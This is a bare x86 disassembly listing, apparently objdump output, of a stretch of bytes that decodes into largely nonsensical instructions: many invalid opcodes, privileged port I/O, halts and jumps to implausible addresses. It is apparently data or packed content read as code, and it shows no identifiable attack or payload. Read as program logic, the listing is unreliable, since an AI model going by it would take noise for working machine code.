  412afe:	cmp    esi,esp
  412b00:	lock or esi,DWORD PTR [esi-0xe]
  412b04:	sbb    cl,BYTE PTR [ebx+0x40]
  412b07:	ins    DWORD PTR es:[edi],dx
  412b08:	out    dx,al
  412b09:	fistp  QWORD PTR [edx]
  412b0b:	xor    eax,0xd1c8b27
  412b10:	outs   dx,DWORD PTR ds:[esi]
  412b11:	cmp    al,0x82
  412b13:	cmp    DWORD PTR [ebx+0x3],0x3016710f
  412b1a:	(bad)  
  412b1b:	repz and bl,ch
  412b1e:	sti    
	...
  412b37:	add    bl,bh
  412b39:	test   eax,0x86e3f654
  412b3e:	mov    BYTE PTR [eax+edx*1-0x14],al
  412b42:	mov    al,BYTE PTR [eax+ebx*1-0x49]
  412b46:	mov    dh,0x23
  412b48:	jg     0x412ae0
  412b4a:	test   eax,0x1e30c2ff
  412b4f:	mov    ebp,DWORD PTR [edi+0x4a17b69e]
  412b55:	xlat   BYTE PTR ds:[ebx]
  412b56:	mov    dh,0xf
  412b58:	stos   DWORD PTR es:[edi],eax
  412b59:	pop    eax
  412b5a:	push   cs
  412b5b:	jmp    FWORD PTR [ecx]
  412b5d:	and    al,0x2a
  412b5f:	or     BYTE PTR [eax+0x794a3cbe],cl
  412b65:	jmp    0x412b73
  412b67:	test   esp,edi
  412b69:	push   ebp
  412b6a:	add    al,BYTE PTR [eax]
  412b6c:	mov    edi,0xa0723e88
  412b71:	adc    al,0x9d
  412b73:	div    BYTE PTR [ebx+0x16]
  412b76:	stc    
  412b77:	pop    ebp
  412b78:	fcomp  DWORD PTR [esi]
  412b7a:	jg     0x412b22
  412b7c:	pop    esp
  412b7d:	push   es
  412b7e:	cmp    eax,0xbf32a20e
  412b83:	cmc    
  412b84:	mov    ecx,0xef740123
  412b89:	mov    ds:0xedf32fc5,al
  412b8e:	aam    0x0
  412b90:	outs   dx,BYTE PTR ds:[esi]
  412b91:	add    al,0xf5
  412b93:	or     esi,DWORD PTR [edi+0x3d]
  412b96:	jmp    0x86:0xe602fffb
	...
  412bb5:	out    dx,eax
  412bb6:	sub    ch,cl
  412bb8:	cmp    al,0xc
  412bba:	mov    bl,0xbd
  412bbc:	cmp    al,0x12
  412bbe:	add    eax,0x81f4c477
  412bc3:	lods   eax,DWORD PTR ds:[esi]
  412bc4:	add    DWORD PTR [edi-0x15d63ebd],edi
  412bca:	outs   dx,BYTE PTR ds:[esi]
  412bcb:	sub    eax,0x2d7b0303
  412bd0:	add    dh,BYTE PTR [ebp-0x4af71fdb]
  412bd6:	jle    0x412bfb
  412bd8:	inc    eax
  412bd9:	jbe    0x412c27
  412bdb:	jmp    0xe946a40a
  412be0:	add    edi,ebx
  412be2:	jp     0x412c11
  412be4:	add    esi,ebx
  412be6:	jp     0x412bfd
  412be8:	add    dh,BYTE PTR [edi-0x56]
  412beb:	add    esi,DWORD PTR fs:[ebp-0x49f70fdb]
  412bf2:	clc    
  412bf3:	cmp    al,BYTE PTR [ebx-0x68220764]
  412bf9:	mov    ch,0x7e
  412bfb:	fwait
  412bfc:	das    
  412bfd:	sahf   
  412bfe:	dec    edi
  412bff:	imul   esp,DWORD PTR [esi-0x39d1fa71],0x3e90693
  412c09:	hlt    
  412c0a:	retf   
  412c0b:	adc    edi,edx
  412c0d:	es inc ebp
  412c0f:	test   al,0x8a
  412c11:	mov    al,0x34
  412c13:	pop    edi
  412c14:	(bad)  
  412c15:	pop    edi
  412c16:	and    BYTE PTR [edx],bl
  412c18:	add    BYTE PTR [eax],0x0
	...
  412c2f:	add    BYTE PTR [eax],al
  412c31:	add    al,dl
  412c33:	xor    al,ch
  412c35:	lock xchg ebx,eax
  412c37:	lds    ebp,FWORD PTR [edi-0x3a]
  412c3a:	pop    ebx
  412c3b:	int3   
  412c3c:	inc    DWORD PTR [ecx]
  412c3e:	add    esi,DWORD PTR ss:[esi-0x49fc095a]
  412c45:	ss cli 
  412c47:	xchg   DWORD PTR [ebp+ebx*8-0x10],esp
  412c4b:	inc    ebp
  412c4c:	(bad)  
  412c4e:	mov    dh,0xc8
  412c50:	out    dx,eax
  412c51:	call   0xf241314d
  412c56:	mov    eax,0x386c991e
  412c5b:	pop    eax
  412c5c:	or     al,0xf9
  412c5f:	jge    0x412cad
  412c61:	mov    ebp,0x958772ef
  412c66:	stos   BYTE PTR es:[edi],al
  412c67:	repz (bad) 
  412c69:	in     eax,dx
  412c6a:	ins    DWORD PTR es:[edi],dx
  412c6b:	mov    ah,0xf3
  412c6d:	sbb    edi,DWORD PTR [eax-0x529fbacd]
  412c73:	das    
  412c74:	mov    BYTE PTR [eax+edx*1],ch
  412c77:	mov    DWORD PTR [edi-0x193000c],edi
  412c7d:	jbe    0x412c7e
  412c7f:	mov    dl,0x88
  412c81:	and    al,0xf8
  412c83:	add    dh,BYTE PTR [esi+0x4439b6fe]
  412c89:	add    ecx,esi
  412c8b:	jge    0x412ce1
  412c8d:	pop    ebp
  412c8e:	out    dx,eax
  412c8f:	mov    bl,ah
  412c91:	jmp    0xb7cc318d
	...
  412cae:	add    BYTE PTR [edi-0x1f1249fe],al
  412cb4:	not    ecx
  412cb6:	pusha  
  412cb7:	lods   eax,DWORD PTR ds:[esi]
  412cb8:	aaa    
  412cb9:	mov    bl,BYTE PTR [ebx+eax*8+0x3bc88c5]
  412cc0:	lock leave 
  412cc2:	popf   
  412cc3:	pop    esp
  412cc4:	push   ds
  412cc5:	add    bl,dl
  412cc7:	leave  
  412cc8:	lds    edi,FWORD PTR [edx]
  412cca:	scas   eax,DWORD PTR es:[edi]
  412ccb:	xchg   ebx,eax
  412ccc:	add    al,BYTE PTR [ebx+0x1a2300]
  412cd2:	add    BYTE PTR [edx-0x4b],bl
  412cd5:	adc    DWORD PTR [ebx-0x49f2c865],ecx
  412cdb:	sbb    DWORD PTR [ecx],eax
  412cdd:	inc    ebx
  412cde:	cmp    eax,ebp
  412ce0:	hlt    
  412ce1:	or     eax,0xfdf6c984
  412ce6:	dec    DWORD PTR [edx+0x44]
  412ce9:	adc    cl,BYTE PTR [ebx+0x4d37ecf8]
  412cef:	xor    DWORD PTR [ebp-0x2d],ebp
  412cf2:	cmp    eax,DWORD PTR [ebp-0x2]
  412cf5:	cmp    edi,0x37
  412cf8:	out    dx,al
  412cf9:	std    
  412cfa:	or     eax,0xffffffdc
  412cfd:	dec    BYTE PTR [eax-0x7af0ead8]
  412d03:	repz sbb al,BYTE PTR [eax]
  412d06:	add    BYTE PTR [ebp+ecx*2-0x6],dl
  412d0a:	cmp    edx,DWORD PTR [ebp+0x1b3b376d]
  412d10:	pop    ebp
  412d11:	jno    0x412d2d
	...
  412d2b:	add    dl,bl
  412d2d:	mov    ah,0x11
  412d2f:	mov    ebx,DWORD PTR [ebx]
  412d31:	cmp    DWORD PTR ds:0x390099b6,ecx
  412d37:	dec    ebp
  412d38:	push   ecx
  412d39:	bound  esp,QWORD PTR [ebx]
  412d3b:	inc    ebx
  412d3c:	dec    edx
  412d3d:	inc    ebp
  412d3e:	adc    bh,BYTE PTR [ecx]
  412d40:	push   eax
  412d41:	add    bh,BYTE PTR [ebx+eiz*8+0x36]
  412d45:	adc    BYTE PTR [ebx-0x417a46ba],cl
  412d4b:	je     0x412cfb
  412d4d:	xor    ebx,DWORD PTR [ebx+0x8]
  412d50:	inc    ebx
  412d51:	cld    
  412d52:	xor    cl,cl
  412d54:	dec    esp
  412d55:	or     DWORD PTR [esp+ebx*2+0x56],0x9a8f0dc9
  412d5d:	idiv   ebp
  412d5f:	push   esp
  412d61:	sahf   
  412d62:	mov    bh,0xef
  412d64:	hlt    
  412d65:	push   edx
  412d66:	jg     0x412d0f
  412d68:	pop    esi
  412d69:	or     edi,DWORD PTR [edx]
  412d6b:	cmp    ch,BYTE PTR [ecx-0x127df7d1]
  412d71:	xor    DWORD PTR [eax],edi
  412d73:	(bad)  
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	imul   ebx,esi,0xdfe17d3f
  412d7b:	(bad)  
  412d7c:	mov    eax,ds:0x8ed68d07
  412d81:	sbb    esi,DWORD PTR [edi]
  412d83:	je     0x412d7d
  412d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d86:	dec    esp
  412d87:	dec    BYTE PTR [ecx-0x7e012fdd]
  412d8d:	dec    ebx
  412d8e:	aaa    
  412d8f:	je     0x412d91
	...
  412da9:	lock jp 0x412d5a
  412dac:	pop    es
  412dad:	or     al,0x37
  412daf:	sub    al,0xfe
  412db1:	repz mov al,ds:0x26710e43
  412db7:	push   cs
  412db8:	add    ah,dh
  412dba:	out    0xfc,al
  412dbc:	pop    esp
  412dbd:	fmul   DWORD PTR [esi]
  412dbf:	push   eax
  412dc0:	call   0xfe79de6a
  412dc5:	jg     0x412da7
  412dc7:	aaa    
  412dc8:	(bad)  
  412dc9:	cmp    DWORD PTR [eax+0x1],edx
  412dcc:	add    ah,dh
  412dce:	sbb    eax,DWORD PTR [ebx-0x1ed80a08]
  412dd4:	cmp    cl,BYTE PTR [edx+0x40]
  412dd7:	pop    es
  412dd8:	sub    DWORD PTR [esi-0x1401c72f],0xffffff99
  412ddf:	or     al,0x43
  412de1:	int    0x78
  412de3:	cs push cs
  412de5:	jo     0x412e66
  412de7:	inc    BYTE PTR cs:[ebx+0x6f13befa]
  412dee:	nop
  412def:	ss cmp cl,al
  412df2:	add    al,0xfd
  412df4:	mov    ecx,0x930ed4a
  412df9:	js     0x412ddc
  412dfb:	add    bh,BYTE PTR [ecx]
  412dfd:	pop    edx
  412dfe:	test   DWORD PTR [ebx-0x4c83acd9],ecx
  412e04:	psubq  mm0,QWORD PTR [edi+0x4f412f9]
  412e0b:	pusha  
  412e0c:	xlat   BYTE PTR ds:[ebx]
	...
  412e25:	add    BYTE PTR [edi],bh
  412e27:	in     eax,dx
  412e28:	and    BYTE PTR [edi-0x57b9121b],dh
  412e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2f:	adc    eax,0xebee71ee
  412e34:	and    esi,DWORD PTR [eax]
  412e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e37:	out    0x29,eax
  412e39:	cmp    DWORD PTR [eax-0x1840ffe8],edi
  412e3f:	mov    al,0xd2
  412e41:	sub    al,0xdd
  412e43:	jge    0x412e73
  412e45:	mov    eax,0x15344470
  412e4a:	das    
  412e4b:	shl    al,cl
  412e4d:	mov    cl,0xf9
  412e4f:	repz scas eax,DWORD PTR es:[edi]
  412e51:	ret    0xbf6c
  412e54:	xor    al,0xfd
  412e56:	mov    ah,0x0
  412e58:	pop    esi
  412e59:	or     ecx,0x48848530
  412e5f:	xor    eax,0x507908e8
  412e64:	jg     0x412e9e
  412e66:	mov    edx,0x2380bec
  412e6b:	sub    DWORD PTR [eax+0x7130aa2e],0xffffffbe
  412e72:	xlat   BYTE PTR ds:[ebx]
  412e73:	les    ebx,FWORD PTR [edi-0x42]
  412e76:	xlat   BYTE PTR ds:[ebx]
  412e77:	das    
  412e78:	rcr    edi,cl
  412e7a:	jle    0x412ed4
  412e7c:	rol    BYTE PTR [ebx],cl
  412e7e:	mov    edi,DWORD PTR [edx+0x30ae8cdc]
  412e84:	(bad)  
  412e85:	mov    ebx,0xb4fed6df
	...
  412ea2:	add    BYTE PTR [edi],al
  412ea4:	xor    BYTE PTR [ebp+esi*8+0x2c],dh
  412ea8:	mov    ecx,0x1da91107
  412ead:	(bad)  
  412eae:	push   ss
  412eaf:	fisubr DWORD PTR [edi+0xe]
  412eb2:	mov    DWORD PTR fs:[ebx],edx
  412eb5:	add    cl,ch
  412eb7:	cmp    bl,ch
  412eb9:	pop    esp
  412eba:	std    
  412ebb:	xchg   DWORD PTR [eax+ebp*8-0x1f],edx
  412ebf:	or     ch,BYTE PTR [edi]
  412ec1:	(bad)  
  412ec2:	fisub  WORD PTR [ebp-0x6609ff42]
  412ec8:	mov    BYTE PTR [ecx],0xa8
  412ecb:	fld    DWORD PTR [edi]
  412ecd:	or     esp,DWORD PTR [ecx+0x24c6456f]
  412ed3:	fadd   QWORD PTR [eax+eax*1]
  412ed6:	jmp    0xbd85acd2
  412edb:	ja     0x412f24
  412edd:	add    al,al
  412edf:	jb     0x412f11
  412ee1:	(bad)  
  412ee2:	jmp    0xe88fa5e1
  412ee7:	bnd jbe 0x412f40
  412eea:	jmp    0x412f24
  412eec:	and    eax,0x7d2de207
  412ef1:	dec    esp
  412ef2:	xchg   ecx,eax
  412ef3:	(bad)  
  412ef4:	cmp    al,0x32
  412ef6:	test   eax,0x703fee70
  412efb:	mov    ch,0x2b
  412efd:	push   cs
  412efe:	pop    ebp
  412eff:	xor    DWORD PTR [ebx-0x3f7f153a],eax
  412f05:	jmp    0x412f79
	...
  412f1f:	add    BYTE PTR [ebp-0x1d2f15c9],bh
  412f25:	enter  0xe8ef,0xf7
  412f29:	add    al,0x0
  412f2b:	sbb    bh,BYTE PTR [eax]
  412f2d:	jge    0x412f73
  412f2f:	add    BYTE PTR [ecx],dh
  412f31:	jo     0x412f1c
  412f33:	push   edx
  412f34:	jle    0x412ef9
  412f36:	mov    DWORD PTR ds:[eax-0xd],ecx
  412f3a:	jmp    0x40019e31
  412f3f:	xor    ebx,DWORD PTR ds:0xe4f04b82
  412f45:	inc    ebp
  412f46:	cli    
  412f47:	inc    edi
  412f48:	test   BYTE PTR [ecx+0xd],0xb6
  412f4c:	jb     0x412f56
  412f4e:	movzx  ebp,BYTE PTR [edx+0x5]
  412f52:	shl    ecx,0x45
  412f55:	xor    bh,BYTE PTR [esi-0xc7739]
  412f5b:	call   FWORD PTR ds:0x46ca0b03
  412f61:	xchg   ebx,eax
  412f62:	mov    ecx,DWORD PTR [eax+0x5a]
  412f65:	jp     0x412f26
  412f67:	sub    DWORD PTR ds:0x51458908,0x6
  412f6e:	mov    esi,0x3e721581
  412f73:	add    BYTE PTR [edx],dl
  412f75:	mov    ecx,0x48be2087
  412f7a:	inc    BYTE PTR [esi+0x54]
  412f7d:	inc    ebp
  412f7e:	cli    
  412f7f:	mov    DWORD PTR [eax],esp
  412f81:	icebp  
  412f82:	or     ecx,0x0
	...
  412f9d:	or     BYTE PTR [ecx],al
  412f9f:	mov    ecx,0x7df782ff
  412fa4:	mov    eax,esi
  412fa6:	lock or eax,0x876faab6
  412fac:	push   ebp
  412fad:	dec    ecx
  412fae:	test   DWORD PTR [esi+0x18f530f],edi
  412fb4:	add    BYTE PTR [ebp+0x1efac083],bl
  412fba:	in     al,dx
  412fbb:	or     eax,0xeea1a0f
  412fc0:	add    ah,dh
  412fc2:	sbb    esi,DWORD PTR ds:0x2fb6923
  412fc8:	inc    ecx
  412fc9:	hlt    
  412fca:	sub    dl,BYTE PTR [eax+0x41]
  412fcd:	mov    edi,0x2d8c05d9
  412fd2:	sbb    eax,DWORD PTR [edx]
  412fd4:	add    BYTE PTR [ebp-0x67],bh
  412fd7:	push   cs
  412fd8:	jmp    0x412fd1
  412fda:	dec    edx
  412fdb:	push   eax
  412fdc:	inc    ecx
  412fdd:	outs   dx,DWORD PTR ds:[esi]
  412fde:	pop    esi
  412fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe0:	cmp    bh,BYTE PTR ds:0x34b8127
  412fe6:	sbb    al,0x2
  412fe8:	or     edx,0x23
  412feb:	add    dh,BYTE PTR [eax+eiz*8-0x6f]
  412fef:	add    bh,bh
  412ff1:	ret    0x8753
  412ff4:	push   ebp
  412ff5:	adc    BYTE PTR [ebx+0x1643e741],ah
  412ffb:	add    al,0x0
  412ffd:	jns    0x41305b
  412fff:	add    al,0x85
	...
  413019:	add    BYTE PTR ds:0x7ffe344b,bl
  41301f:	jmp    0xb3131a5b
  413024:	int    0x1b
  413026:	iret   
  413027:	jno    0x413021
  413029:	fadd   DWORD PTR [ebx+0x2e0a8857]
  41302f:	push   cs
  413030:	call   0x39dc31a9
  413035:	add    bl,dh
  413037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413038:	pop    eax
  413039:	repnz fist DWORD PTR [esi+0x51f54a89]
  413040:	les    ebp,FWORD PTR [ebx+edi*8]
  413043:	lahf   
  413044:	inc    esp
  413045:	bnd ret 
  413047:	scas   al,BYTE PTR es:[edi]
  413048:	mov    BYTE PTR [esp+edi*4-0x26],cl
  41304c:	xor    al,0x44
  41304e:	or     BYTE PTR [ebp-0x43],dh
  413051:	adc    ebp,DWORD PTR [edx]
  413053:	add    eax,0x2c12b86
  413058:	jmp    0xc5179f60
  41305d:	call   0x5741a25
  413062:	jae    0x4130a6
  413064:	cmp    al,0x35
  413066:	add    BYTE PTR [ecx],0x21
  413069:	sub    ebp,DWORD PTR [ebp+0x3b03e902]
  41306f:	(bad)  
  413070:	aam    0x2
  413072:	hlt    
  413073:	add    al,0xe9
  413075:	sub    BYTE PTR [ebx+0x3],0xee
  413079:	xchg   DWORD PTR [ebp+0x3e902],ebx
	...
  413097:	bswap  edi
  413099:	jl     0x41309f
  41309b:	ja     0x4130ff
  41309d:	cld    
  41309e:	xor    al,0x42
  4130a0:	std    
  4130a1:	adc    DWORD PTR ss:[edi-0x57f60d7f],esi
  4130a8:	out    0xdd,al
  4130aa:	test   DWORD PTR [ebp+0x31],esi
  4130ad:	in     eax,0x34
  4130af:	jbe    0x4130db
  4130b1:	in     al,dx
  4130b2:	mov    ch,0x4
  4130b4:	adc    dl,0x6
  4130b7:	mov    cl,ah
  4130b9:	cmp    DWORD PTR [bx+si+0x4],esi
  4130bd:	jmp    0x4cc923c5
  4130c2:	xor    edx,edi
  4130c4:	sub    al,0x69
  4130c6:	mov    ch,0x53
  4130c8:	add    eax,0x38557ede
  4130cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ce:	xor    al,0xe2
  4130d0:	ret    0xfaf4
  4130d3:	xor    BYTE PTR [ecx],dl
  4130d5:	pop    ss
  4130d6:	inc    esp
  4130d7:	fdiv   QWORD PTR [edx-0x100bfc16]
  4130dd:	es test al,0x46
  4130e0:	sbb    ebp,DWORD PTR [eax-0x8]
  4130e3:	in     eax,dx
  4130e4:	mov    cl,0xff
  4130e6:	jg     0x41309c
  4130e8:	pop    ds
  4130e9:	in     eax,0xa6
  4130eb:	push   0x18
  4130ed:	add    ecx,ebp
  4130ef:	test   DWORD PTR [ebx+eax*4],0x8bfbf661
  4130f6:	mov    cl,0xf5
  4130f8:	add    al,0x0
  4130fa:	adc    al,BYTE PTR [eax]
	...
  413114:	mov    ds:0xb76a0ea0,al
  413119:	cmp    dh,bh
  41311b:	ds lock jb 0x413131
  41311f:	stos   BYTE PTR es:[edi],al
  413120:	je     0x413150
  413122:	or     dh,bl
  413124:	jmp    0x41310b
  413126:	repnz sub BYTE PTR es:[edi-0x7f0f3607],al
  41312e:	sbb    BYTE PTR [edx],bl
  413130:	or     BYTE PTR [ebx],ch
  413132:	adc    BYTE PTR [ebx],0xd7
  413135:	sub    edi,esi
  413137:	jmp    0xfa4db234
  41313c:	pop    es
  41313d:	sub    edi,esi
  41313f:	lods   al,BYTE PTR ds:[esi]
  413140:	add    ebp,esi
  413142:	inc    esp
  413143:	aad    0x61
  413145:	cmp    eax,ebp
  413147:	or     edx,edi
  413149:	add    al,0x0
  41314b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41314c:	sub    eax,0xf7e90118
  413151:	add    al,0x83
  413153:	shl    ecx,1
  413155:	sti    
  413156:	mov    ebx,ecx
  413158:	stc    
  413159:	add    al,0x0
  41315b:	add    ah,BYTE PTR [esi]
  41315d:	mov    al,ds:0x37206a0e
  413162:	(bad)  
  413163:	scas   al,BYTE PTR es:[edi]
  413164:	div    DWORD PTR [edx+0x12]
  413167:	sub    bh,BYTE PTR [ebx+0x2d]
  41316a:	or     BYTE PTR ds:0xc9f98801,dl
  413170:	mov    edi,edi
  413172:	adc    BYTE PTR [ebx+0xfe2c50],0x0
	...
  413191:	int    0x6
  413193:	test   ebp,ecx
  413195:	aas    
  413196:	clc    
  413197:	std    
  413198:	jmp    eax
  41319a:	or     al,0x39
  41319c:	inc    ebp
  41319d:	shl    DWORD PTR [ebp-0x2d],0xe9
  4131a1:	sub    eax,0xd2000002
  4131a6:	cmp    eax,0x79d0112
  4131ab:	add    BYTE PTR [ebx-0x73f0fddb],al
  4131b1:	fld    QWORD PTR [ecx]
  4131b3:	add    BYTE PTR [eax],al
  4131b5:	not    BYTE PTR [esi+0x6a]
  4131b8:	pmaxub mm3,QWORD PTR [eax+0x81afff1]
  4131bf:	mov    dh,0x13
  4131c1:	mov    es,WORD PTR [edx+0xc790af8]
  4131c7:	cmp    edx,0x58
  4131ca:	push   es
  4131cb:	mov    ss,WORD PTR [ebp-0x7e020811]
  4131d1:	idiv   DWORD PTR [ebp-0x2]
  4131d4:	dec    DWORD PTR [ebp+0x6]
  4131d7:	test   BYTE PTR [ecx-0x209d1],cl
  4131dd:	push   eax
  4131de:	adc    edi,DWORD PTR [ecx]
  4131e0:	inc    ebp
  4131e1:	and    DWORD PTR [ebp-0x31],esi
  4131e4:	jmp    0x413282
  4131e9:	bound  edi,QWORD PTR [edx+edx*1]
  4131ec:	add    DWORD PTR ds:0x35830007,ebx
  4131f2:	add    BYTE PTR [edi],cl
  4131f4:	mov    WORD PTR [eax],es
	...
  41320e:	mov    DWORD PTR [eax],eax
  413210:	add    BYTE PTR [eax],al
  413212:	out    0x54,al
  413214:	push   0xf
  413216:	pop    esi
  413217:	jb     0x41320a
  413219:	call   FWORD PTR [edx+0xe13b607]
  41321f:	cmp    al,0xa
  413222:	hlt    
  413223:	and    bh,BYTE PTR [esi+0x55]
  413226:	(bad)  
  413227:	jnp    0x41325a
  413229:	cmp    BYTE PTR [esi+0x750bb031],0x86
  413230:	xchg   edi,edi
  413232:	mov    bl,0x1c
  413234:	add    DWORD PTR [ebp-0x1ce51cf],eax
  41323a:	mov    ds:0x31391659,eax
  41323f:	xor    BYTE PTR [eax+0x3749dd0],dh
  413245:	add    ah,dh
  413247:	push   cs
  413248:	push   esi
  413249:	inc    ecx
  41324a:	ins    DWORD PTR es:[edi],dx
  41324b:	mov    DWORD PTR [esi],edx
  41324d:	cmp    esi,DWORD PTR [esi-0xab681e5]
  413253:	sbb    eax,DWORD PTR [edx]
  413255:	jmp    0x41324e
  413257:	cs push esp
  413259:	inc    ecx
  41325a:	pop    ds
  41325b:	inc    edx
  41325c:	sahf   
  41325d:	push   cs
  41325e:	ja     0x4132ce
  413260:	(bad)  
  413261:	push   esp
  413263:	and    bh,BYTE PTR [eax+0xa]
  413266:	jg     0x4132da
  413268:	test   BYTE PTR [ecx+0x7fc54cf0],0x55
  41326f:	and    BYTE PTR [ecx],al
  413271:	test   DWORD PTR [eax],eax
	...
  41328b:	std    
  41328c:	sub    eax,0x612bfe30
  413291:	push   ss
  413292:	cmp    DWORD PTR [ecx+0xdd8b027],edi
  413298:	add    eax,0xef40003
  41329d:	push   esi
  41329e:	inc    ecx
  41329f:	jge    0x413292
  4132a1:	pop    ss
  4132a2:	cmp    esi,DWORD PTR [esi]
  4132a4:	xor    edi,DWORD PTR [esi+0xd]
  4132a7:	cmc    
  4132a8:	sbb    eax,DWORD PTR [edx]
  4132aa:	jmp    0x4132a3
  4132ac:	cs push esp
  4132ae:	inc    ecx
  4132af:	das    
  4132b0:	cli    
  4132b1:	lahf   
  4132b2:	push   cs
  4132b3:	ja     0x4132b9
  4132b5:	(bad)  
  4132b6:	(bad)  
  4132b7:	fld    TBYTE PTR [ecx]
  4132b9:	in     eax,dx
  4132ba:	jns    0x4132ba
  4132bc:	jge    0x4132fc
  4132be:	clc    
  4132bf:	jge    0x4132b9
  4132c1:	test   esp,0xec2443
  4132c7:	jo     0x413300
  4132c9:	ja     0x4132fc
  4132cb:	mov    dl,0x29
  4132cd:	sub    ebx,DWORD PTR [eax]
  4132cf:	in     eax,dx
  4132d0:	mov    edi,0x1bbcb1d4
  4132d5:	inc    ebx
  4132d6:	add    al,0xf4
  4132d8:	add    al,0x1a
  4132da:	push   esi
  4132db:	xor    eax,0xcf17bb7c
  4132e0:	inc    esi
  4132e1:	fnstsw WORD PTR [edi-0x5b]
  4132e4:	add    al,0xe9
  4132e6:	add    ecx,DWORD PTR [edi-0x4aaa05fb]
  4132ec:	in     eax,dx
  4132ed:	xchg   esi,eax
  4132ee:	lahf   
	...
  413307:	add    dl,bh
  413309:	test   DWORD PTR [edx],edx
  41330b:	add    ah,dh
  41330d:	add    al,0xf6
  41330f:	jns    0x4132ff
  413311:	jge    0x4132c9
  413313:	idiv   DWORD PTR [ebp-0x8]
  413316:	test   esp,0xe723cb
  41331c:	jns    0x4132b1
  41331e:	div    DWORD PTR [eax]
  413320:	cmp    ch,BYTE PTR [ecx]
  413322:	mov    ds:0xdcbfed17,eax
  413327:	mov    cl,0x4c
  413329:	sbb    eax,DWORD PTR [edi+0x4]
  41332c:	hlt    
  41332d:	add    al,0x1a
  41332f:	push   esi
  413330:	mov    ch,0x7b
  413332:	xor    ebx,DWORD PTR [eax]
  413334:	iret   
  413335:	inc    esi
  413336:	in     eax,0x7f
  413338:	popa   
  413339:	add    al,0xe9
  41333b:	add    ecx,DWORD PTR [edi]
  41333d:	add    eax,0xedb555fa
  413342:	push   ds
  413343:	mov    al,ds:0x56ff8402
  413348:	jmp    0x413372
  41334a:	(bad)  
  41334b:	ficomp WORD PTR [ebp-0x5]
  41334e:	mov    bh,BYTE PTR [edi]
  413350:	fdivr  QWORD PTR [esi+0xb]
  413353:	clc    
  413354:	mov    eax,0xf4e8e0a8
  413359:	adc    BYTE PTR [eax+ebx*4+0x4],0x27
  41335e:	(bad)  
  41335f:	sub    al,0xdc
  413361:	in     eax,dx
  413362:	inc    esp
  413363:	aad    0x65
  413365:	dec    ebp
  413366:	jmp    0x60:0x4156a101
	...
  413385:	retf   0x3b14
  413388:	sub    ecx,DWORD PTR [ebx-0x5b]
  41338b:	jmp    0xa612:0x415688ea
  413392:	pushf  
  413393:	push   cs
  413394:	push   0x5e
  413396:	cld    
  413397:	(bad)  
  413398:	call   0x724ba291
  41339d:	dec    ebp
  41339e:	hlt    
  41339f:	mov    ebp,esp
  4133a1:	push   es
  4133a2:	les    edi,FWORD PTR [edi+0x48]
  4133a5:	pop    es
  4133a6:	clc    
  4133a7:	test   cl,cl
  4133a9:	es daa 
  4133ab:	(bad)  
  4133ac:	push   ds
  4133ad:	cmp    dl,BYTE PTR [ecx+edi*1]
  4133b0:	lods   al,BYTE PTR ds:[esi]
  4133b1:	jecxz  0x413359
  4133b3:	fadd   DWORD PTR [edx]
  4133b5:	dec    eax
  4133b6:	repz shr DWORD PTR [ebx-0x3dec2f42],1
  4133bd:	mov    ecx,0xf0022bab
  4133c2:	repz shr DWORD PTR [ebx-0x99435f0],1
  4133c9:	jbe    0x4133bf
  4133cb:	or     ebp,ecx
  4133cd:	div    edi
  4133cf:	mov    ch,0xe2
  4133d1:	mov    ss,ecx
  4133d3:	xor    esp,DWORD PTR [ebx-0xc]
  4133d6:	adc    eax,0xe18d0043
  4133db:	push   cs
  4133dc:	mulps  xmm1,XMMWORD PTR [edi+ebp*8]
  4133e0:	jmp    DWORD PTR [edx-0x1bebbc29]
  4133e6:	cmp    al,0x12
  4133e8:	jle    0x4133ea
	...
  413402:	mov    ah,0xab
  413404:	dec    ebx
  413405:	clc    
  413406:	(bad)  
  413407:	ror    BYTE PTR ds:0xfdddf384,0xff
  41340e:	dec    esi
  41340f:	jbe    0x4133fb
  413411:	add    dl,al
  413413:	jl     0x4133a5
  413415:	or     eax,0x558b039d
  41341a:	sub    DWORD PTR [eax+eax*8-0x5a9eb06],eax
  413421:	adc    DWORD PTR [edi],0x28
  413424:	or     eax,0x49487
  413429:	add    BYTE PTR [edx],ah
  41342b:	sbb    eax,0x408e6393
  413430:	dec    BYTE PTR [eax-0x3ec4f0b8]
  413436:	mov    al,0x5b
  413438:	mov    DWORD PTR [esi+0x31],eax
  41343b:	sbb    dl,dh
  41343d:	jae    0x4133c9
  41343f:	cmp    BYTE PTR [eax+ebx*1+0x4d],0x6f
  413444:	sbb    BYTE PTR [edx+0x5d],ch
  413447:	(bad)  
  413448:	je     0x413462
  41344a:	(bad)  
  41344b:	call   0xaa928adb
  413450:	shr    eax,0x6b
  413453:	dec    edx
  413454:	(bad)  
  413455:	call   FWORD PTR [eax-0x69a98c40]
  41345b:	inc    ebp
  41345c:	imul   bl
  41345e:	xor    BYTE PTR [edx-0x3cf9e3ac],ch
  413464:	cmp    eax,ebx
	...
  41347e:	add    BYTE PTR [edx-0xbfc75f4],ch
  413484:	adc    eax,esi
  413486:	sub    ecx,DWORD PTR [ecx-0xa067eb8]
  41348c:	jmp    0x1d78be80
  413491:	call   0xf8294ddb
  413496:	inc    edx
  413497:	jecxz  0x41347a
  413499:	pop    ss
  41349a:	cmp    DWORD PTR [ecx],ebp
  41349c:	sub    BYTE PTR [esi-0x26aa204e],ch
  4134a2:	(bad)  
  4134a3:	jg     0x41347b
  4134a5:	lahf   
  4134a6:	mov    ah,BYTE PTR [ebx+eax*2+0x26ae3a51]
  4134ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ae:	mov    cl,ah
  4134b0:	mov    bl,0xc4
  4134b2:	jnp    0x413525
  4134b4:	pop    esp
  4134b5:	mov    dh,0x12
  4134b7:	(bad)  
  4134b9:	sti    
  4134ba:	jne    0x4134a6
  4134bc:	or     bh,BYTE PTR ds:0xce567d40
  4134c2:	cmp    dh,BYTE PTR [ebp-0x7a9782e1]
  4134c8:	mov    bh,0x2d
  4134ca:	cmp    cl,0xeb
  4134cd:	add    cl,BYTE PTR [edi]
  4134cf:	jns    0x4134ab
  4134d1:	es (bad) 
